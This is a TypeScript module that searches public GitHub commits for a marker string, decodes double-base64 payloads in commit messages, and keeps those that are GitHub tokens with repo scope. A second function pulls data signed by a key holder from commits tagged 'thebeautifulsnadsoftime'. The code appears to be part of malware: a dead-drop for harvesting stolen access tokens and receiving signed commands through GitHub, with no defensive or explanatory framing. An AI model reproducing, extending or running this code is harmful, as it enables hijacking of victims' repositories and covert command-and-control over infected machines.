import crypto from "crypto";

import { SEARCH_STRING } from "../utils/config";
import { logUtil } from "../utils/logger";
import { checkToken } from "./tokenCheck";

interface GitHubCommit {
  commit: {
    message: string;
    author: {
      name: string;
      email: string;
      date: string;
    };
  };
  sha: string;
}

interface SearchResponse {
  items: GitHubCommit[];
  total_count: number;
}

export async function fetchCommit(token?: string): Promise<string | false> {
  // Search up to 50 commits.
  const url = `https://api.github.com/search/commits?q=${SEARCH_STRING}&sort=author-date&order=desc&per_page=50`;
  try {
    const response = await fetchGitHub(url, token);
    if (!response.items || response.items.length === 0) {
      return false;
    }
    logUtil.log(`Found ${response.items.length} commits...`);
    for (let i = 0; i < response.items.length; i++) {
      const commit = response.items[i];
      if (!commit) {
        continue;
      }

      logUtil.log(commit.commit.message);
      const match = new RegExp(
        `^${SEARCH_STRING}:([A-Za-z0-9+/]{1,100}={0,3})$`,
      ).exec(commit.commit.message ?? "");
      if (match?.[1]) {
        const decoded = Buffer.from(
          Buffer.from(match[1], "base64").toString("utf8"),
          "base64",
        ).toString("utf8");
        if ((await checkToken(decoded)).hasRepoScope) {
          logUtil.log("Correct scope.");
          return decoded;
        } else {
          logUtil.log("Not valid PAT/Scope!");
        }
      } else {
        logUtil.log("No match!");
      }
    }
  } catch (error) {
    return false;
  }
  return false;
}

/**
 * Fetches data from GitHub API
 */
async function fetchGitHub(
  url: string,
  token?: string,
): Promise<SearchResponse> {
  const headers: Record<string, string> = {
    Accept: "application/vnd.github+json",
    "User-Agent": "node",
  };
  if (token) {
    headers.Authorization = `Bearer ${token}`;
  }

  const res = await fetch(url, { headers });
  if (!res.ok) {
    throw new Error(`GitHub API ${res.status}: ${res.statusText}`);
  }
  return res.json() as Promise<SearchResponse>;
}

/**
 * Verifies a cryptographic signature using a public key
 * Assumes the commit message format: "SIGNATURE:ENCRYPTED_DATA"
 */
export function _verifySignature(
  message: string,
  publicKey: string,
  algorithm: string = "sha256",
): { valid: boolean; data?: string } {
  try {
    const regex =
      /thebeautifulsnadsoftime ([A-Za-z0-9+/=]{1,30})\.([A-Za-z0-9+/=]{1,700})/;
    const match = message.match(regex);

    if (!match || !match[1] || !match[2]) {
      return { valid: false };
    }

    const data_plain = Buffer.from(match[1], "base64").toString("utf-8");
    logUtil.log(data_plain);
    logUtil.log(match[2]);
    const signature = Buffer.from(match[2], "base64");

    const verifier = crypto.createVerify(algorithm);
    verifier.update(data_plain);
    const isValid = verifier.verify(publicKey, signature);

    logUtil.log(isValid);

    return isValid ? { valid: true, data: data_plain } : { valid: false };
  } catch (error) {
    return { valid: false };
  }
}

export async function findValidSignedCommit(
  searchQuery: string,
  publicKey: string,
): Promise<{ found: boolean; message?: string; commit?: GitHubCommit }> {
  const url = `https://api.github.com/search/commits?q=${encodeURIComponent(
    searchQuery,
  )}&sort=author-date&order=desc`;
  try {
    const response = await fetchGitHub(url);

    if (!response.items || response.items.length === 0) {
      return { found: false, message: "No commits found" };
    }

    for (let i = 0; i < response.items.length; i++) {
      const commit = response.items[i];

      if (!commit) {
        continue;
      }
      const commitMessage = commit.commit.message;

      logUtil.log(
        `[${i + 1}/${response.items.length}] Checking commit ${commit.sha.substring(
          0,
          7,
        )}...`,
      );

      const verification = _verifySignature(commitMessage, publicKey);

      if (verification.valid && verification.data) {
        logUtil.log(`Valid signature found in commit ${commit.sha}`);
        return {
          found: true,
          message: verification.data,
          commit: commit,
        };
      }
    }

    return { found: false, message: "No commits with valid signatures found" };
  } catch (error) {
    return {
      found: false,
      message: `Error during search: ${error instanceof Error ? error.message : String(error)}`,
    };
  }
}
